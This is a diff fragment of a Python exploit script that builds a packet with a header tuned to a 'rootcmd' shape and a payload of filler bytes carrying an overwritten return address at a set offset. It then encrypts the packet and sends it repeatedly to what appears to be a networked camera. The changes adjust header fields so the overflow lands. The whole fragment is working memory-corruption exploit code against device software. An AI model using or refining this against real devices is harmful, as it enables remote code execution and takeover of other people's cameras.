@@ -80,14 +80,14 @@ def main() -> int:
     # fixed header (rootcmd's proven shape); the template only supplies the channel
     hdr = bytearray(28)
     hdr[0] = a.channel
-    hdr[1] = 0x01
+    hdr[1] = tmpl[1] if tmpl[1] in (0x00, 0x01, 0x04, 0x05) else 0x01
     struct.pack_into("<H", hdr, 2, 0)
     n = int(time.time()) & 0x7FFFFFFF
-    struct.pack_into("<H", hdr, 8, 1)
+    struct.pack_into("<H", hdr, 8, struct.unpack_from("<H", tmpl, 8)[0])  # live tx
     struct.pack_into("<H", hdr, 12, 1)          # frag count
     struct.pack_into("<H", hdr, 14, 0)          # header skip
     struct.pack_into("<H", hdr, 16, a.declared)
-    struct.pack_into("<I", hdr, 20, n)          # packet number (gated)
+    struct.pack_into("<I", hdr, 20, 0)          # packet number (rootcmd leaves it 0)
     struct.pack_into("<I", hdr, 24, n)          # frame number
     pl = bytearray(b"\x41" * a.declared)
     pl[a.ra_off:a.ra_off + 4] = struct.pack("<I", a.ra)
@@ -101,7 +101,7 @@ def main() -> int:
     if a.dry:
         return 0
     for i in range(a.repeat):
-        struct.pack_into("<I", hdr, 20, n + i)
+        struct.pack_into("<I", hdr, 20, i)
         struct.pack_into("<I", hdr, 24, n + i)
         cam.send(cam.encrypt(23, bytes(hdr) + bytes(pl)))
         print(f"sent {i + 1}/{a.repeat}")
